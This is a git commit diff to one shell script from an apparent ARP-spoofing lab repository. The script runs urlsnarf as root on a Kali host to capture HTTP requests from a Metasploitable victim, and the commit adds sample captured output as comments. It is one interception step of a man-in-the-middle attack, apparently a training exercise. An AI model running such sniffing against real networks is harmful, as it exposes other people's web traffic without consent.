75607a5c9128182b256e3b54b18b445b5d4d98d1
hellcard <wseven347.devopser@gmail.com>
2025-01-04 22:30:33 -0700

    Update tab-4.sh

--- arp-spoofing-attck/kali/tab-4.sh
+++ arp-spoofing-attck/kali/tab-4.sh
@@ -1,4 +1,6 @@
 # Tab-4
 sudo -i
 urlsnarf -i eth0
-# output - victim's (metasploitable) request
+# output - victim's (metasploitable) request 
+# urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]
+# 192.168.1.101 - - [05/Jan/2025:00:25:20 -0500] "GET http://www.google.com/ HTTP/1.0" - - "-" "Wget/1.10.2"
